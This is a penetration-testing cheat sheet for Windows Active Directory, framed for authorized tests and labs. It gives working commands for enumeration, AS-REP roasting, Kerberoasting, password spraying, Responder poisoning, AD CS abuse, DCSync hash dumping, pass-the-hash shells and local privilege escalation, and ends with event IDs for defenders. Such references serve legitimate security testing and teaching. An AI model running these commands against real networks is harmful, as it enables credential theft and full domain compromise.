# Windows and Active Directory testing reference

For authorized internal tests and labs. Order of work: enumerate without credentials, get a first account, enumerate with it, find a path to higher privileges.

## Without credentials

- Find domain controllers: ports 53, 88, 389, 445 open together. Domain name from the LDAP or SMB banner: `nmap -sC -sV -p 88,389,445 HOST`.
- Null session and guest: `netexec smb HOST -u '' -p ''`, `netexec smb HOST -u guest -p '' --shares`, `rpcclient -U '' -N HOST` then `enumdomusers`.
- Anonymous LDAP: `ldapsearch -x -H ldap://HOST -b "DC=corp,DC=local"`.
- User name discovery through Kerberos (no lockout): `kerbrute userenum -d corp.local --dc HOST users.txt`.
- AS-REP roasting (accounts without Kerberos pre-authentication): `impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip HOST`. Crack the result with hashcat mode 18200.
- Password spraying: one or two likely passwords against all users, staying under the lockout threshold. Read the policy first: `netexec smb HOST -u USER -p PASS --pass-pol`. Only when the scope allows it.
- Name-resolution poisoning (LLMNR, NBT-NS) with Responder captures NetNTLMv2 hashes (hashcat mode 5600). Only when the scope allows it, since it affects other users.

## With a domain account

- Collect the directory for path analysis: `bloodhound-python -d corp.local -u USER -p PASS -ns DC_IP -c All`, then look at "Shortest paths to Domain Admins" in BloodHound.
- Kerberoasting (any user can request service tickets): `impacket-GetUserSPNs corp.local/USER:PASS -dc-ip HOST -request`. Crack with hashcat mode 13100. Service accounts often have weak passwords and high rights.
- Shares: `netexec smb HOSTS -u USER -p PASS --shares`; search readable shares for scripts, configs and passwords. `SYSVOL` may hold old Group Policy Preferences passwords (`cpassword` in XML files, decryptable with `gpp-decrypt`).
- Descriptions and attributes: passwords are sometimes written in the user `description` field.
- Where is the account local administrator: `netexec smb HOSTS -u USER -p PASS` marks those hosts with `(Pwn3d!)`.
- Certificate services (AD CS): `certipy find -u USER@corp.local -p PASS -dc-ip HOST -vulnerable` lists misconfigured templates (ESC1 to ESC8 and later).

## Common escalation paths

| Finding | What it allows |
|---|---|
| `GenericAll` / `GenericWrite` on a user | Reset the password, or set an SPN and Kerberoast the user |
| `WriteDACL` on the domain object | Grant yourself replication rights, then DCSync |
| `ForceChangePassword` | Set a new password for that user |
| Member of a group with `AddMember` on another group | Add yourself to the higher group |
| Unconstrained delegation on a host you control | Capture tickets of users who connect, including a domain controller |
| Constrained or resource-based delegation | Impersonate a user to a specific service |
| Local admin on a host where a privileged user is logged in | Read that user's credentials from memory |
| Replication rights (DCSync) | Read every password hash: `impacket-secretsdump corp.local/USER:PASS@DC` |

## Using credentials and hashes

- Shell with a password: `evil-winrm -i HOST -u USER -p PASS` (port 5985), `impacket-psexec corp.local/USER:PASS@HOST` (needs local admin), `impacket-wmiexec`.
- Pass the hash (NTLM hash instead of a password): `evil-winrm -i HOST -u USER -H NTHASH`, `netexec smb HOST -u USER -H NTHASH`.
- Pass the ticket: export `KRB5CCNAME=ticket.ccache` and add `-k -no-pass` to impacket tools. The clock must be within 5 minutes of the domain controller.

## Local privilege escalation on Windows

- `whoami /priv`: `SeImpersonatePrivilege` (service accounts, IIS, MSSQL) leads to SYSTEM with a potato-family tool; `SeBackupPrivilege` allows reading any file, including the SAM and SYSTEM hives.
- Services: unquoted paths with spaces, writable service binaries, changeable service configuration (`sc qc NAME`, `accesschk`).
- `AlwaysInstallElevated` in both HKLM and HKCU: any MSI installs as SYSTEM.
- Stored credentials: `cmdkey /list`, autologon values in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, `unattend.xml`, PowerShell history file `ConsoleHost_history.txt`.
- Enumeration scripts: `winPEAS`, `PowerUp`, `Seatbelt`.

## Useful event ids for the defending side

4624 logon, 4625 failed logon, 4648 logon with explicit credentials, 4672 special privileges assigned, 4720 user created, 4728 / 4732 added to a group, 4768 Kerberos TGT requested, 4769 service ticket requested (many with RC4 encryption suggests Kerberoasting), 4776 NTLM validation, 7045 service installed, 1102 audit log cleared.
